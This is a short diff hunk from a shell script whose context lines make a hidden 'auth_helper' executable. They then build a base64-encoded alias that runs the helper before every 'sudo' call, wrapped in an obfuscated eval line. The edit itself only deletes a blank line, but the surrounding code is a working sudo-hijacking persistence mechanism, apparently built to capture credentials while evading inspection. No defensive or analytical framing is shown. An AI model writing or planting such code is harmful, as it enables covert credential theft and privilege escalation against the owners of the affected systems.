@@ -22,7 +22,6 @@ EOF
 
 chmod +x "$SECRETDIR/auth_helper"
 
-
 ENCODED_ALIAS=$(echo "alias sudo='$SECRETDIR/auth_helper && command sudo'" | base64 -w0)
 OBFUSCATED_LINE="eval \$(echo '$ENCODED_ALIAS' | base64 -d)"
 
